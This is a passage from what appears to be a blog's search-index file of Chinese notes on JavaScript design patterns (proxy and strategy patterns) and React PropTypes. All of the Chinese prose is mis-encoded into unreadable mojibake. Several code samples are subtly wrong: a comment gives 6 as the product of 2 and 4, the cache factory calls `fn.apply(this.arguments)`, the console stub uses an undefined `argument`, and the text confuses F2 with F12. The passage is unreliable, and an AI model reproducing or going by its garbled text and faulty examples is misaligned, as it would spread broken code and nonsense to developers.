(this.checked) &#123; synchronousFile(this.id); &#125; &#125;&#125; å½“æˆ‘ä»¬é€‰ä¸­ 3 ä¸ª checkbox çš„æ—¶å€™ï¼Œä¾æ¬¡å¾€æœåŠ¡å™¨å‘é€äº† 3 æ¬¡åŒæ­¥æ–‡ä»¶çš„è¯·æ±‚ã€‚è€Œç‚¹å‡»ä¸€ä¸ª checkbox å¹¶ä¸æ˜¯å¾ˆå¤æ‚çš„æ“ä½œï¼Œå¯ä»¥é¢„è§ï¼Œå¦‚æ­¤é¢‘ç¹çš„ç½‘ç»œè¯·æ±‚å°†ä¼šå¸¦æ¥ç›¸å½“å¤§çš„å¼€é”€ã€‚ è§£å†³æ–¹æ¡ˆæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åŒä¸€ä¸ªä»£ç†å‡½æ•° proxySynchronousFile æ¥æ”¶é›†ä¸€æ®µæ—¶é—´ä¹‹å†…çš„è¯·æ±‚ï¼Œæœ€åŽä¸€æ¬¡æ€§å‘é€ç»™æœåŠ¡å™¨ã€‚æ¯”å¦‚æˆ‘ä»¬ç­‰å¾…äº†2ç§’ä¹‹åŽæ‰æŠŠè¿™2ç§’ä¹‹å†…çš„éœ€è¦åŒæ­¥çš„æ–‡ä»¶ID æ‰“åŒ…å‘é€ç»™ æœåŠ¡å™¨ï¼Œå¦‚æžœä¸æ˜¯å¯¹å®žæ—¶æ€§è¦æ±‚å¾ˆé«˜çš„ç³»ç»Ÿï¼Œ2ç§’çš„å»¶è¿Ÿä¸ä¼šå¸¦æ¥å¤ªå¤§çš„å‰¯ä½œç”¨ï¼Œå´èƒ½å¤§å¤§å‡è½»æœåŠ¡å™¨çš„åŽ‹åŠ›ã€‚ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829var synchronousFile = function (id) &#123; console.log('å¼€å§‹åŒæ­¥æ–‡ä»¶ï¼Œidä¸ºï¼š' + id);&#125; var proxySynchronousFile = (function () &#123; var cache = [], // ä¿å­˜ä¸€æ®µæ—¶é—´å†…éœ€è¦åŒæ­¥çš„ ID timer; // å®šæ—¶å™¨ return function (id) &#123; cache.push(id); if (timer) &#123; return; &#125; timer = setTimeout(function () &#123; synchronousFile(cache.join(',')); // console.log(cache); clearTimeout(timer); timer = null; cache.length = 0; &#125;, 2000); &#125; &#125;)();var checkbox = document.getElementsByTagName('input');for (var i = 0, c; c = checkbox[i++];) &#123; c.onclick = function () &#123; if (this.checked) &#123; proxySynchronousFile(this.id); &#125; &#125;&#125; è™šæ‹Ÿä»£ç†åœ¨æƒ°æ€§åŠ è½½ä¸­çš„åº”ç”¨ä½œè€…æˆ‘æ›¾ç»å†™è¿‡ä¸€ä¸ª mini æŽ§åˆ¶å°çš„å¼€æºé¡¹ç›® miniConsole.jsï¼Œè¿™ä¸ªæŽ§åˆ¶å°å¯ä»¥å¸®åŠ©å¼€å‘è€…åœ¨ IE æµè§ˆå™¨ä»¥åŠç§»åŠ¨ç«¯æµè§ˆå™¨ä¸Šè¿›è¡Œä¸€äº›ç®€å•çš„è°ƒè¯•å·¥ä½œã€‚è°ƒç”¨æ–¹å¼å¾ˆç®€å•ï¼š 1miniConsole.log(1); è¿™å¥è¯ä¼šåœ¨é¡µé¢ä¸­åˆ›å»ºä¸€ä¸ª divï¼Œå¹¶ä¸”æŠŠ log æ˜¾ç¤ºåœ¨ div é‡Œé¢ã€‚miniConsole.jsçš„ä»£ç é‡å¤§æ¦‚æœ‰1000è¡Œå·¦å³ï¼Œä¹Ÿè®¸æˆ‘ä»¬å¹¶ä¸æƒ³ä¸€å¼€å§‹å°±åŠ è½½è¿™ä¹ˆå¤§çš„JSæ–‡ä»¶ï¼Œå› ä¸ºä¹Ÿè®¸å¹¶ä¸æ˜¯æ¯ä¸ªç”¨æˆ·éƒ½éœ€è¦æ‰“å° logã€‚æˆ‘ä»¬å¸Œæœ›åœ¨æœ‰å¿…è¦çš„æ—¶å€™æ‰å¼€å§‹åŠ è½½å®ƒï¼Œæ¯”å¦‚å½“ç”¨æˆ·æŒ‰ä¸‹ F2 æ¥ä¸»åŠ¨å”¤å‡ºæŽ§åˆ¶å°çš„æ—¶å€™ã€‚ åœ¨ miniConsole.js åŠ è½½ä¹‹å‰ï¼Œä¸ºäº†èƒ½å¤Ÿè®©ç”¨æˆ·æ­£å¸¸åœ°ä½¿ç”¨é‡Œé¢çš„ APIï¼Œé€šå¸¸æˆ‘ä»¬çš„è§£å†³æ–¹æ¡ˆæ˜¯ç”¨ä¸€ä¸ªå ä½çš„ miniConsole ä»£ç†å¯¹è±¡æ¥ç»™ç”¨æˆ·æå‰ä½¿ç”¨ï¼Œè¿™ä¸ªä»£ç†å¯¹è±¡æä¾›ç»™ç”¨æˆ·çš„æŽ¥å£ï¼Œè·Ÿå®žé™…çš„ miniConsole æ˜¯ä¸€æ ·çš„ã€‚ ç”¨æˆ·ä½¿ç”¨è¿™ä¸ªä»£ç†å¯¹è±¡æ¥æ‰“å° log çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šçœŸæ­£åœ¨æŽ§åˆ¶å°å†…æ‰“å°æ—¥å¿—ï¼Œæ›´ä¸ä¼šåœ¨é¡µé¢ä¸­åˆ›å»ºä»»ä½• DOM èŠ‚ç‚¹ã€‚å³ä½¿æˆ‘ä»¬æƒ³è¿™æ ·åšä¹Ÿæ— èƒ½ä¸ºåŠ›ï¼Œå› ä¸ºçœŸæ­£çš„ miniConsole.js è¿˜æ²¡æœ‰è¢«åŠ è½½ã€‚ äºŽæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ‰“å° log çš„è¯·æ±‚éƒ½åŒ…è£¹åœ¨ä¸€ä¸ªå‡½æ•°é‡Œé¢ï¼Œè¿™ä¸ªåŒ…è£…äº†è¯·æ±‚çš„å‡½æ•°å°±ç›¸å½“äºŽå…¶ä»–è¯­è¨€ä¸­å‘½åæ¨¡å¼çš„ Command å¯¹è±¡ã€‚éšåŽè¿™äº›å‡½æ•°å°†å…¨éƒ¨æ”¾åˆ°ç¼“å­˜é˜Ÿåˆ—ä¸­ï¼Œè¿™äº›é€»è¾‘éƒ½æ˜¯åœ¨ miniConsole ä»£ç†å¯¹è±¡ä¸­å®Œæˆå®žçŽ°çš„ã€‚ç­‰ç”¨æˆ·æŒ‰ä¸‹ F12 çš„å¬å”¤å‡ºæŽ§åˆ¶å°çš„æ—¶å€™ï¼Œæ‰å¼€å§‹çœŸæ­£åŠ è½½ miniConsole çš„ä»£ç ï¼ŒåŠ è½½å®Œæˆä¹‹åŽå°†éåŽ†çš„ miniConsole ä»£ç†å¯¹è±¡ä¸­ç¼“å­˜å‡½æ•°é˜Ÿåˆ—ï¼ŒåŒæ—¶ä¾æ¬¡æ‰§è¡Œå®ƒä»¬ã€‚ æœªåŠ è½½çœŸæ­£çš„ miniConsole.js ä¹‹å‰çš„ä»£ç å¦‚ä¸‹ï¼š 12345678910var cache = [];var miniConsole = &#123; log:function()&#123; var args = arguments; cache.push(function()&#123; return miniConsole.log.apply(miniConsole,args); &#125;); &#125;&#125;miniConsole.log(1); å½“ç”¨æˆ·æŒ‰ä¸‹ F12 çš„æ—¶å€™ï¼Œå¼€å§‹çœŸæ­£åŠ è½½ miniConsole.js ,ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021var handler = function(ev)&#123; if(ev.keyCode === 113)&#123; var script = document.createElement('script'); script.onload = function()&#123; for(var i=0,fn;fn=cache[i++])&#123; fn(); &#125; &#125; script.src = 'miniConsole.js'; document.getElementsByTagName('head')[0].appendChild(script); &#125;&#125;document.body.addEventListener('keydown',handler,false);// miniConsole.js ä»£ç miniConsole = &#123; log:function()&#123; // çœŸæ­£çš„ä»£ç  console.log(Array.prototype.join.call(argument)); &#125;&#125; å¦å¤–è¿™é‡Œè¦æ³¨æ„ï¼Œæˆ‘ä»¬è¦ä¿è¯ F12 è¢«é‡å¤æŒ‰ä¸‹çš„æ—¶å€™ï¼ŒminiConsole.js åªè¢«åŠ è½½ä¸€æ¬¡ã€‚å¦å¤–ï¼Œæˆ‘ä»¬æ•´ç†ä¸€ä¸‹ miniConsole ä»£ç†å¯¹è±¡çš„ä»£ç ï¼Œä½¿å®ƒæˆä¸ºä¸€ä¸ªæ ‡å‡†çš„è™šæ‹Ÿå¯¹è±¡ã€‚ 123456789101112131415161718192021222324252627282930313233var miniConsole = (function()&#123; var cache = []; var handler = function(ev)&#123; if(ev.keyCode === 113)&#123; var script = document.createElement('script'); script.onload = function()&#123; for(var i=0,fn;fn=cache[i++])&#123; fn(); &#125; &#125; script.src = 'miniConsole.js'; document.getElementsByTagName('head')[0].appendChild(script); document.body.removeEventListener('keydown',handler); // åªåŠ è½½ä¸€æ¬¡ miniConsole.js &#125; &#125; document.body.addEventListener('keydown',handler,false); return&#123; log:function()&#123; var args = arguments; cache.push(function()&#123; return miniConsole.log.apply(miniConsole,args); &#125;); &#125; &#125;&#125;)();miniConsole.log(11);// miniConsole.js ä»£ç miniConsole = &#123; log:function()&#123; // çœŸæ­£çš„ä»£ç  console.log(Array.prototype.join.call(argument)); &#125;&#125; ç¼“å­˜ä»£ç†ç¼“å­˜ä»£ç†å¯ä»¥ä¸ºä¸€äº›å¼€é”€å¤§çš„è®¡ç®—ç»“æžœæä¾›æš‚æ—¶çš„å­˜å‚¨ï¼Œåœ¨ä¸‹æ¬¡è¿ç®—çš„æ—¶å€™ï¼Œå¦‚æžœä¼ é€’è¿›æ¥å‚æ•°è·Ÿä¹‹å‰çš„ä¸€æ ·ï¼Œåˆ™å¯ä»¥ç›´æŽ¥è¿”å›žå‰é¢å­˜å‚¨çš„è¿ç®—ç»“æžœã€‚ è®¡ç®—ä¹˜ç§¯ç¼–å†™ä¸€ä¸ªç®€å•çš„æ±‚ä¹˜ç§¯ç¨‹åºä½œä¸ºæ¼”ç¤ºï¼š 12345678910var mult = function()&#123; console.log('å¼€å§‹è®¡ç®—ä¹˜ç§¯'); var a = 1; for(var i=0,l = arguments.length;i&lt;l;i++)&#123; a = a * arguments[i]; &#125; return a;&#125;mult(2,4); // è¾“å‡ºï¼š6mult(2,3,4); // è¾“å‡ºï¼š24 åŠ å…¥ç¼“å­˜ä»£ç†å‡½æ•°ï¼š 12345678910111213var proxyMult = (function()&#123; var cache = &#123;&#125;; return function()&#123; var args = Array.prototype.join.call(arguments,','); if(args in cache)&#123; return cache[args]; &#125; return cache[args] = mult.apply(this,arguments); &#125;&#125;)();proxyMult(1,2,3,4); // 24proxyMult(1,2,3,4); // 24 å½“æˆ‘ä»¬ç¬¬äºŒæ¬¡è°ƒç”¨ proxyMult(1,2,3,4) çš„æ—¶å€™ï¼Œæœ¬ä½“ mult å‡½æ•°å¹¶æ²¡æœ‰è¢«è®¡ç®—ï¼ŒproxyMult ç›´æŽ¥è¿”å›žäº†ä¹‹å‰ç¼“å­˜å¥½çš„è®¡ç®—ç»“æžœã€‚ é€šè¿‡å¢žåŠ ç¼“å­˜ä»£ç†çš„æ–¹å¼ï¼Œmult å‡½æ•°å¯ä»¥ç»§ç»­ä¸“æ³¨äºŽè‡ªèº«çš„èŒè´£â€”â€”è®¡ç®—ä¹˜ç§¯ï¼Œç¼“å­˜çš„åŠŸèƒ½ç”±ä»£ç†å¯¹è±¡æ¥å®žçŽ°ã€‚ ajax å¼‚æ­¥è¯·æ•°æ®æˆ‘ä»¬å¸¸å¸¸åœ¨é¡¹ç›®ä¸­é‡åˆ°åˆ†é¡µçš„éœ€æ±‚ï¼ŒåŒä¸€é¡µçš„æ•°æ®ç†è®ºä¸Šåªéœ€è¦åŽ»åŽå°æ‹‰å–ä¸€æ¬¡ï¼Œè¿™äº›å·²ç»æ‹‰å–åˆ°çš„æ•°æ®åœ¨æŸä¸ªåœ°æ–¹è¢«ç¼“å­˜ä¹‹åŽï¼Œä¸‹æ¬¡å†è¯·æ±‚åŒä¸€é¡µçš„æ—¶å€™ï¼Œä¾¿å¯ä»¥ç›´æŽ¥ä½¿ç”¨ä¹‹å‰çš„æ•°æ®ã€‚ æ˜¾ç„¶è¿™é‡Œä¹Ÿæ˜¯å¯ä»¥å¼•å…¥ç¼“å­˜ä»£ç†ï¼Œå®žçŽ°æ–¹å¼è·Ÿè®¡ç®—ä¹˜ç§¯å·®ä¸å¤šï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œè¯·æ±‚æ•°æ®æ˜¯ä¸€ä¸ªå¼‚æ­¥çš„æ“ä½œï¼Œæˆ‘ä»¬æ— æ³•ç›´æŽ¥æŠŠè®¡ç®—ç»“æžœæ”¾åˆ°ä»£ç†å¯¹è±¡çš„ç¼“å­˜ä¸­ï¼Œè€Œæ˜¯è¦é€šè¿‡å›žè°ƒçš„æ–¹å¼ã€‚ ç”¨é«˜é˜¶å‡½æ•°åŠ¨æ€åˆ›å»ºä»£ç†é€šè¿‡ä¼ å…¥é«˜é˜¶å‡½æ•°è¿™ç§æ›´åŠ çµæ´»çš„æ–¹å¼ï¼Œå¯ä»¥ä¸ºå„ç§è®¡ç®—æ–¹å¼åˆ›å»ºç¼“å­˜ä»£ç†ã€‚çŽ°åœ¨è¿™äº›è®¡ç®—æ–¹å¼è¢«å½“åšå‚æ•°ä¼ å…¥ä¸€ä¸ªä¸“é—¨ç”¨äºŽåˆ›å»ºæ¢ç²—ä»£ç†çš„å·¥åŽ‚ä¸­ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç§°ä¸ºä¹˜æ³•ã€åŠ æ³•ã€å‡æ³•ç­‰åˆ›å»ºç¼“å­˜ä»£ç†ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536// è®¡ç®—ä¹˜ç§¯var mult = function()&#123; console.log('å¼€å§‹è®¡ç®—ä¹˜ç§¯'); var a = 1; for(var i=0,l = arguments.length;i&lt;l;i++)&#123; a = a * arguments[i]; &#125; return a;&#125;// è®¡ç®—åŠ å’Œvar plus = function()&#123; var a = 0; for(var i=0,l = arguments.length;i&lt; l;i++)&#123; a = a + arguments[i]; &#125; return a;&#125;// åˆ›å»ºç¼“å­˜ä»£ç†çš„å·¥åŽ‚var createProxyFactory = function(fn)&#123; var cache = &#123;&#125;; return function()&#123; var args = Array.prototype.join.call(arguments,','); if(args in cache)&#123; return cache[args]; &#125; return cache[args] = fn.apply(this.arguments); &#125;&#125;var proxyMult = createProxyFactory(mult);var plusMult = createProxyFactory(plus);proxyMult(1,2,3,4); // 24proxyMult(1,2,3,4); // 24plusMult(1,2,3,4); // 10plusMult(1,2,3,4); // 10 å…¶ä»–ä»£ç†æ¨¡å¼ä»£ç†æ¨¡å¼çš„å˜ä½“ç§ç±»éžå¸¸å¤š é˜²ç«å¢™ä»£ç†ï¼šæŽ§åˆ¶ç½‘ç»œèµ„æºçš„è®¿é—®ï¼Œä¿æŠ¤ä¸»é¢˜ä¸è¢«â€œåäººâ€æŽ¥è¿‘ è¿œç¨‹ä»£ç†ï¼šä¸ºä¸€ä¸ªå¯¹è±¡åœ¨ä¸åŒçš„åœ°å€ç©ºé—´æä¾›å±€éƒ¨ä»£è¡¨ï¼Œåœ¨java ä¸­ï¼Œè¿œç¨‹ä»£ç†å¯ä»¥æ˜¯å¦å¤–ä¸€ä¸ªè™šæ‹Ÿæœºä¸­çš„ä»£ç† ä¿æŠ¤ä»£ç†ï¼šç”¨äºŽå¯¹è±¡åº”è¯¥æœ‰ä¸åŒè®¿é—®æƒé™çš„æƒ…å†µ æ™ºèƒ½åº”ç”¨ä»£ç†ï¼šå–ä»£äº†ç®€å•çš„æŒ‡é’ˆï¼Œå®ƒåœ¨è®¿é—®å¯¹è±¡æ—¶æ‰§è¡Œäº†ä¸€äº›é™„åŠ æ“ä½œï¼Œæ¯”å¦‚è®¡ç®—äº†ä¸€ä¸ªå¯¹è±¡è¢«å¼•ç”¨çš„æ¬¡æ•°ã€‚ å†™æ—¶å¤åˆ¶ä»£ç†ï¼šé€šå¸¸ç”¨äºŽå¤åˆ¶ä¸€ä¸ªåºžå¤§å¯¹è±¡çš„æƒ…å†µã€‚å†™æ—¶å¤åˆ¶ä»£ç†å»¶è¿Ÿäº†å¤åˆ¶çš„è¿‡ç¨‹ï¼Œå½“å¯¹è±¡è¢«çœŸæ­£ä¿®æ”¹çš„æ—¶å€™ï¼Œæ‰å¯¹å®ƒè¿›è¡Œå¤åˆ¶æ“ä½œã€‚å†™æ—¶å¤åˆ¶ä»£ç†æ˜¯è™šæ‹Ÿä»£ç†çš„ä¸€ç§å˜ä½“ï¼ŒDLL ï¼ˆæ“ä½œç³»ç»Ÿä¸­çš„åŠ¨æ€é“¾æŽ¥åº“ï¼‰æ˜¯å…¶å…¸åž‹è¿ç”¨åœºæ™¯ã€‚ å°ç»“ä»£ç†æ¨¡å¼åŒ…æ‹¬å¾ˆå¤šå°åˆ†ç±»ï¼ŒJavaScript å¼€å‘ä¸­æœ€å¸¸ç”¨çš„æ˜¯è™šæ‹Ÿä»£ç†å’Œç¼“å­˜ä»£ç†ã€‚è™½ç„¶ä»£ç†æ¨¡å¼éžå¸¸æœ‰ç”¨ï¼Œä½†æˆ‘ä»¬ç¼–å†™æŸä¸ªä¸šåŠ¡é€»è¾‘ä»£ç çš„æ—¶å€™ï¼Œå¾€å¾€ä¸éœ€è¦é¢„å…ˆçŒœæµ‹æ˜¯å¦éœ€è¦ä½¿ç”¨ä»£ç†æ¨¡å¼ã€‚å½“çœŸæ­£å‘çŽ°ä¸æ–¹ä¾¿ç›´æŽ¥è®¿é—®æŸä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œå†å†™ä»£ç†ä¹Ÿä¸è¿Ÿã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PropTypes]]></title>
    <url>%2F2019-02-19-PropTypes.html</url>
    <content type="text"><![CDATA[PropTypes ç±»åž‹æ£€æŸ¥PropTypes ä¾‹å­1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import PropTypes from 'prop-types';MyComponent.propTypes = &#123; // å°†å±žæ€§å£°æ˜Žä¸ºä»¥ä¸‹ JS åŽŸç”Ÿç±»åž‹ optionalArray:PropTypes.array, optionalBool:PropTypes.bool, optionalFunc:PropTypes.func, optionalObject:PropTypes.object, optionalNumber:PropTypes.number, optionalSting:PropTypes.string, optionalSymbol:PropTypes.symbol, // å¯è¢«æ¸²æŸ“çš„å…ƒç´ ï¼ˆåŒ…æ‹¬æ•°å­—ã€å­—ç¬¦ä¸²ã€å­å…ƒç´ æˆ–è€…æ•°ç»„ï¼‰ optionalNode:PropTypes.node, // ä¸€ä¸ª React å…ƒç´  optionalElement:PropTypes.element, // å£°æ˜Žå±žæ€§ä¸ºæŸä¸ªç±»çš„å®žä¾‹ï¼Œä½¿ç”¨ JS çš„ instanceof æ“ä½œç¬¦å®žçŽ° optionalMessage:PropTypes.instanceof(Message), // é™åˆ¶å±žæ€§å€¼æ˜¯æŸä¸ªç‰¹å®šå€¼ä¹‹ä¸€ optionalEnum:PropTypes.oneOf(['News','Photos']), // é™åˆ¶ä¸ºåˆ—ä¸¾ç±»åž‹ä¹‹ä¸€çš„å¯¹è±¡ optionalUnion:PropTypes.oneOfType([ PropTypes.string, PropTypes.number, PropTypes.instanceof(Message) ]), // æŒ‡å®šå…ƒç´ ç±»åž‹çš„æ•°ç»„ optionalArrayOf:PropTypes.arrayOf(PropTypes.number), // æŒ‡å®šç±»åž‹çš„å¯¹è±¡ optionalObjectOf:PropTypes.objectOf(PropTypes.number), // æŒ‡å®šå±žæ€§åŠå…¶ç±»åž‹çš„å¯¹è±¡ optionalObjectWithShape:PropTypes.shape(&#123; color:PropTypes.string, fontSize:PropTypes.number &#125;), // å¯ä»¥åœ¨ä»»ä½• PropTypes å±žæ€§åŽé¢åŠ ä¸Š 'isRequired' åŽç¼€ï¼Œè¿™æ ·å¦‚æžœè¿™ä¸ªå±žæ€§çˆ¶ç»„ä»¶æ²¡æœ‰æä¾›æ—¶ï¼Œä¼šæ‰“å°è­¦å‘Šæ¶ˆæ¯ requiredFunc:PropTypes.func.isRequired, // ä»»ä½•ç±»åž‹çš„æ•°æ® requiredAny:PropTypes.any.isRequired, // å¯ä»¥æ‰§è¡Œä¸€ä¸ªè‡ªå®šä¹‰éªŒè¯å™¨ï¼Œåœ¨éªŒè¯å¤±è´¥æ—¶è¿”å›žä¸€ä¸ª Error å¯¹è±¡è€Œä¸æ˜¯ 'console.warn' æˆ–æŠ›å‡ºå¼‚å¸¸ï¼Œåœ¨ oneOfType ä¸­ä¸èµ·ä½œç”¨ customProp:function(props,propName,componentName)&#123; if(!/matchme/.test(props[propName]))&#123; return new Error( 'Invalid prop `' + propName + '` supplied to' + ' `' + componentName + '`. Validation failed.' ); &#125; &#125;, // æä¾›ä¸€ä¸ªè‡ªå®šä¹‰çš„ `arrayOf` æˆ– `objectOf` éªŒè¯å™¨ï¼Œå®ƒåº”è¯¥åœ¨éªŒè¯å¤±è´¥æ—¶è¿”å›žä¸€ä¸ª Error å¯¹è±¡ã€‚ å®ƒè¢«ç”¨äºŽéªŒè¯æ•°ç»„æˆ–å¯¹è±¡çš„æ¯ä¸ªå€¼ã€‚éªŒè¯å™¨å‰ä¸¤ä¸ªå‚æ•°çš„ç¬¬ä¸€ä¸ªæ˜¯æ•°ç»„æˆ–å¯¹è±¡æœ¬èº«ï¼Œç¬¬äºŒä¸ªæ˜¯å®ƒä»¬å¯¹åº”çš„é”®ã€‚ customArrayProp: PropTypes.arrayOf(function(propValue, key, componentName, location, propFullName) &#123; if (!/matchme/.test(propValue[key])) &#123; return new Error( 'Invalid prop `' + propFullName + '` supplied to' + ' `' + componentName + '`. Validation failed.' ); &#125; &#125;)&#125; å±žæ€§é»˜è®¤å€¼defaultProps å¯ä»¥ä¸º props å®šä¹‰é»˜è®¤å€¼ã€‚ 123456789101112131415161718class Greeting extends React.Component &#123; render() &#123; return ( &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt; ); &#125;&#125;// ä¸ºå±žæ€§æŒ‡å®šé»˜è®¤å€¼:Greeting.defaultProps = &#123; name: 'Stranger'&#125;;// æ¸²æŸ“ "Hello, Stranger":ReactDOM.render( &lt;Greeting /&gt;, document.getElementById('example'));]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>PropTypes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”ç­–ç•¥æ¨¡å¼]]></title>
    <url>%2F2019-02-16-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”ç­–ç•¥æ¨¡å¼ä¿—è¯è¯´ï¼Œæ¡æ¡å¤§è·¯é€šç½—é©¬ã€‚åœ¨ç¨‹åºè®¾è®¡ä¸­ï¼Œè¦å®žçŽ°ä¸€ä¸ªåŠŸèƒ½æœ‰å¾ˆå¤šç§æ–¹æ¡ˆå¯ä»¥é€‰æ‹©ã€‚æ¯”å¦‚ä¸€ä¸ªåŽ‹ç¼©æ–‡ä»¶çš„ç¨‹åºï¼Œæ—¢å¯ä»¥é€‰æ‹© zip ç®—æ³•ï¼Œè¿˜å¯ä»¥é€‰æ‹© gzip ç®—æ³•ã€‚ è¿™äº›ç®—æ³•çµæ´»å¤šæ ·ï¼Œè€Œä¸”å¯ä»¥éšæ„äº’ç›¸è½¬æ¢ã€‚è¿™ç§æ›¿æ¢æ–¹æ¡ˆå°±æ˜¯ç­–ç•¥æ¨¡å¼ã€‚ ç­–ç•¥æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šå®šä¹‰ä¸€ç³»åˆ—çš„ç®—æ³•ï¼ŒæŠŠå®ƒä»¬ä¸€ä¸ªä¸ªå°è£…èµ·æ¥ï¼Œå¹¶ä¸”ä½¿å®ƒä»¬å¯ä»¥äº’ç›¸æ›¿æ¢ ä½¿ç”¨ç­–ç•¥æ¨¡å¼è®¡ç®—å¥–é‡‘ç­–ç•¥æ¨¡å¼æœ‰å¾ˆå¹¿æ³›çš„åº”ç”¨ï¼Œæœ¬èŠ‚ä»¥å¹´ç»ˆå¥–çš„è®¡ç®—ä¸ºä¾‹è¿›è¡Œä»‹ç»ã€‚å¾ˆå¤šå…¬å¸çš„å¹´ç»ˆå¥–æ˜¯æ ¹æ®å‘˜å·¥çš„å·¥èµ„åŸºæ•°å’Œå¹´åº•ç»©æ•ˆæƒ…å†µæ¥å‘æ”¾çš„ã€‚ä¾‹å¦‚ï¼šç»©æ•ˆä¸º S çš„äººå¹´ç»ˆå¥–æœ‰ 4å€å·¥èµ„ï¼Œç»©æ•ˆä¸º Açš„äººå¹´ç»ˆå¥–æœ‰ 3å€å·¥èµ„ï¼Œè€Œç»©æ•ˆä¸º B çš„äººå¹´ç»ˆå¥–æ˜¯ 2 å€å·¥èµ„ã€‚å‡è®¾è´¢åŠ¡éƒ¨è¦æ±‚æˆ‘ä»¬æä¾›ä¸€æ®µä»£ç ï¼Œæ¥æ–¹ä¾¿è®¡ç®—å‘˜å·¥çš„å¹´ç»ˆå¥–ã€‚ 1.åˆæ­¥æƒ³æ³•å’Œå®žçŽ°12345678910111213141516var calculateBonus = function(performanceLevel,salary)&#123; if(performanceLevel === 'S')&#123; return salary * 4; &#125; if(performanceLevel === 'A')&#123; return salary * 3; &#125; if(performanceLevel === 'B')&#123; return salary * 2; &#125;&#125;calculateBonus('S',2000);calculateBonus('B',2000);calculateBonus('A',2000);// å¯ä»¥è½»æ˜“åœ°çœ‹å‡ºæ¥ï¼ŒcalculateBonus å‡½æ•°æ¯”è¾ƒåºžå¤§ï¼ŒåŒ…å«äº†å¾ˆå¤š if-else è¯­å¥ï¼Œè¿™äº›è¯­å¥è¦è¦†ç›–æ‰€æœ‰çš„é€»è¾‘åˆ†æ”¯ã€‚ç¼ºä¹å¼¹æ€§ï¼Œå¦‚æžœå¢žåŠ äº†ä¸€ç§ç»©æ•ˆç­‰çº§ï¼Œæˆ–è€…è¦æŠŠæŸä¸ªç»©æ•ˆç­‰çº§çš„å·¥èµ„æ›´æ”¹å°±å¿…é¡»æ·±å…¥calculateBonus å‡½æ•°çš„å†…éƒ¨å®žçŽ°ã€‚// ç®—æ³•çš„å¤ç”¨æ€§å·®ï¼Œå¦‚æžœåœ¨ç¨‹åºä¸­è¦å¤ç”¨è¿™äº›ç®—æ³•ï¼Œåªèƒ½å¤åˆ¶ç²˜è´´ã€‚ 2.ä½¿ç”¨ç»„åˆå‡½æ•°é‡æž„ä»£ç ä¸€èˆ¬æœ€å®¹æ˜“æƒ³åˆ°çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨ç»„åˆå‡½æ•°æ¥é‡æž„ä»£ç ï¼Œæˆ‘ä»¬æŠŠå„ç§ç®—æ³•å°è£…åˆ°ä¸€ä¸ªå‡½æ•°é‡Œé¢ï¼Œå‡½æ•°æœ‰å„è‡ªçš„å‘½åï¼Œå¯ä»¥ä¸€ç›®äº†ç„¶çŸ¥é“å®ƒå¯¹åº”å“ªç§ç®—æ³•ã€‚å®ƒä»¬ä¹Ÿå¯ä»¥è¢«å¤ç”¨åœ¨ç¨‹åºä¸­çš„å…¶ä»–åœ°æ–¹ã€‚ 12345678910111213141516171819202122var calculateBonus = function (performanceLevel, salary) &#123; if (performanceLevel === 'S') &#123; return performanceS(salary); &#125; if (performanceLevel === 'A') &#123; return performanceA(salary); &#125; if (performanceLevel === 'B') &#123; return performanceB(salary); &#125;&#125;var performanceS = function (salary) &#123; return salary * 4;&#125;var performanceA = function (salary) &#123; return salary * 3;&#125;var performanceB = function (salary) &#123; return salary * 2;&#125;calculateBonus('A',2000); å¯ä»¥çœ‹å‡ºæ¥ï¼ŒcalculateBonus å‡½æ•°æœ‰å¯èƒ½è¶Šæ¥è¶Šåºžå¤§ï¼Œè€Œä¸”åœ¨ç³»ç»Ÿå˜åŒ–çš„æ—¶å€™ç¼ºä¹å¼¹æ€§ã€‚ 3.ä½¿ç”¨ç­–ç•¥æ¨¡å¼é‡æž„ä»£ç 